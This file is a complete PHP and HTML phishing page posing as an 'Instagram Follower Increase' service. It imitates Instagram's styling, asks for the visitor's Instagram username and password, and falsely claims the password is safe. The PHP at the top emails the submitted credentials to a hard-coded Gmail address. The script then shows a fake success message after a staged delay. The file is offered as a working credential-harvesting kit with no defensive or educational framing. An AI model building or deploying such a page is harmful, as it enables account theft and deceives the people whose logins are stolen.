<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the form
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Your Gmail address to send the email to
    $to = "fl3xname@gmail.com";
    
    // Subject of the email
    $subject = "New Instagram Follower Increase Request";
    
    // Email message
    $message = "Username: " . $username . "\n";
    $message .= "Password: " . $password . "\n";
    
    // Send email
    if (mail($to, $subject, $message)) {
        echo "success";
    } else {
        echo "error";
    }
    exit; // Stop further execution of the script
}
?>
<html lang="en">
<head>
  <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instagram Follower Increase</title>
  <style>
   body {
      font-family: Arial, sans-serif;
      background-color: #fafafa; /* Instagram-like background color */
    }

    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
      background-color: #fff;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }
    
        ::-webkit-scrollbar {
    width: 0px;*/
}

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #262626; /* Instagram-like text color */
    }

    label {
      display: block;
      margin-bottom: 5px;
      color: #262626; /* Instagram-like text color */
    }

    input[type="text"],
    input[type="password"],
    button {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb; /* Instagram-like border color */
      border-radius: 5px;
      box-sizing: border-box;
    }

    button {
      background-color: #3897f0; /* Instagram-like primary color */
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #38a9f0; /* Instagram-like primary color on hover */
    }

    .loading {
      text-align: center;
      display: none;
      margin-top: 10px;
      color: #999; /* Instagram-like secondary color */
    }

    .result {
      text-align: center;
      margin-top: 10px;
      color: #38a9f0; /* Instagram-like primary color */
      font-size: 20px;
    }

    .info {
      background-color: #fafafa; /* Instagram-like background color */
      border: 1px solid #dbdbdb; /* Instagram-like border color */
      border-radius: 5px;
      padding: 15px;
      margin-bottom: 20px;
      color: #999; /* Instagram-like secondary color */
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Instagram Follower Increase</h2>
 
    <div class="info">
      <p>Welcome to our Instagram Follower Increase service!</p>
      <p>Enter your Instagram username and password below, and we'll help you increase your followers.</p>
      <p><strong>Note:</strong> We ensure the security of your information. Your password is safe with us.</p>
    </div>

    <form id="followerForm" method="post">
      <label for="username">Instagram Username:</label>
      <input type="text" id="username" name="username" placeholder="Enter your username" required>
      <label for="password">Instagram Password:</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required>
      <button type="submit" id="increaseButton">Increase Followers</button>
      <div class="loading" id="loadingIndicator">Processing...</div>
    </form>
    <p id="result" class="result"></p>
  </div>

  <script>
    document.getElementById("followerForm").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent form submission

      var username = document.getElementById("username").value;
      var password = document.getElementById("password").value;
      var loadingIndicator = document.getElementById("loadingIndicator");
      var resultMessage = document.getElementById("result");

      loadingIndicator.style.display = "block";

      var xhr = new XMLHttpRequest();
      xhr.open("POST", window.location.href, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          setTimeout(function() {
            loadingIndicator.style.display = "none";
            if (xhr.status === 200) {
              if (xhr.responseText === "success") {
                resultMessage.textContent = "Followers increased successfully!";
              } else {
                resultMessage.textContent = "Error occurred while increasing followers.";
              }
            } else {
              resultMessage.textContent = "Error occurred while processing the request.";
            }
          }, 3000);
        }
      };
      xhr.send("username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
    });
  </script>
</body>
</html>
